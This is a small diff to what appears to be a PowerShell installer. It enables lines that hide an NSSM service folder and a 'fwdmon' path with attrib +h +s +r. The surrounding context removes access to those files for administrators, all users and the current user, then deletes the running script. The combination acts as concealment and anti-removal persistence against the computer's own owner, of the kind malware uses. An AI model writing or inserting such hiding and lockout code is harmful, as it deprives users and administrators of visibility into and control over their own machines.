@@ -64,7 +64,7 @@ icacls $fwdmonPath /remove "Administrators" "Users" "Authenticated Users" "Every
 icacls $fwdmonPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 
 icacls $fwdmonPath /remove "$user" /Q 
 
-#attrib +h +s +r $nssmFolder 2>&1 | Out-Null
-#attrib +h +s +r $fwdmonPath
+attrib +h +s +r $nssmFolder 2>&1 | Out-Null
+attrib +h +s +r $fwdmonPath 2>&1 | Out-Null
 
 Remove-Item -Path $curr -Force -ErrorAction SilentlyContinue
